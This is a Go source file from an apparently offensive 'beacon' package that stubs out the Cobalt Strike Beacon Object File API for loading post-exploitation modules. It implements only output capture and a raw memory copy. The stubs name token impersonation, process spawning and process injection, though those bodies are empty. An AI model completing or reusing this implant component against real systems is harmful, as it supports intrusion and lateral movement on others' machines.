package beacon

import (
	"bytes"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
	"io/ioutil"
	"strings"
	"syscall"
	"unsafe"
)

// todo
func InternalFunctions(funcname string) (uintptr, bool) {
	var beaconfunc uintptr
	if strings.Contains(funcname, "BeaconOutput") {
		beaconfunc = syscall.NewCallback(BeaconOutput)
	} else if strings.Contains(funcname, "BeaconDataParse") {

	} else if strings.Contains(funcname, "BeaconDataInt") {

	} else if strings.Contains(funcname, "BeaconDataShort") {

	} else if strings.Contains(funcname, "BeaconDataLength") {

	} else if strings.Contains(funcname, "BeaconDataExtract") {

	} else if strings.Contains(funcname, "BeaconFormatAlloc") {

	} else if strings.Contains(funcname, "BeaconFormatReset") {

	} else if strings.Contains(funcname, "BeaconFormatFree") {

	} else if strings.Contains(funcname, "BeaconFormatAppend") {

	} else if strings.Contains(funcname, "BeaconFormatPrintf") {

	} else if strings.Contains(funcname, "BeaconFormatToString") {

	} else if strings.Contains(funcname, "BeaconFormatInt") {

	} else if strings.Contains(funcname, "BeaconPrintf") {

	} else if strings.Contains(funcname, "BeaconOutput") {

	} else if strings.Contains(funcname, "BeaconUseToken") {

	} else if strings.Contains(funcname, "BeaconRevertToken") {

	} else if strings.Contains(funcname, "BeaconIsAdmin") {

	} else if strings.Contains(funcname, "BeaconGetSpawnTo") {

	} else if strings.Contains(funcname, "BeaconSpawnTemporaryProcess") {

	} else if strings.Contains(funcname, "BeaconInjectProcess") {

	} else if strings.Contains(funcname, "BeaconInjectTemporaryProcess") {

	} else if strings.Contains(funcname, "BeaconCleanupProcess") {

	} else if strings.Contains(funcname, "toWideChar") {

	}
	if beaconfunc != 0 {
		return uintptr(beaconfunc), true
	} else {
		return 0, false
	}
}

func Memcpy(src, dst, size uintptr) {
	for i := uintptr(0); i < size; i++ {
		*(*byte)(unsafe.Pointer(dst + i)) = *(*byte)(unsafe.Pointer(src + i))
	}
}

var beaconCompatibilityOutput []byte
var beaconCompatibilitySize int
var beaconCompatibilityOffset int

func BeaconOutput(outputType int, d uintptr, length int) uintptr {
	data := make([]byte, length)
	Memcpy(d, uintptr(unsafe.Pointer(&data[0])), uintptr(length))
	beaconCompatibilityOutput = append(beaconCompatibilityOutput, make([]byte, length)...)
	copy(beaconCompatibilityOutput[beaconCompatibilityOffset:], data[:length])
	beaconCompatibilitySize += length
	beaconCompatibilityOffset += length
	return 0
}

func GbkToUtf8(s []byte) ([]byte, error) {
	reader := transform.NewReader(bytes.NewReader(s), simplifiedchinese.GBK.NewDecoder())
	d, e := ioutil.ReadAll(reader)
	if e != nil {
		return nil, e
	}
	return d, nil
}

func BeaconGetOutputData(outsize *int) string {
	utf8, err := GbkToUtf8(beaconCompatibilityOutput)
	if err != nil {
		utf8 = beaconCompatibilityOutput
	}
	outdata := string(utf8)
	*outsize = beaconCompatibilitySize
	beaconCompatibilityOutput = nil
	beaconCompatibilitySize = 0
	beaconCompatibilityOffset = 0
	return outdata
}
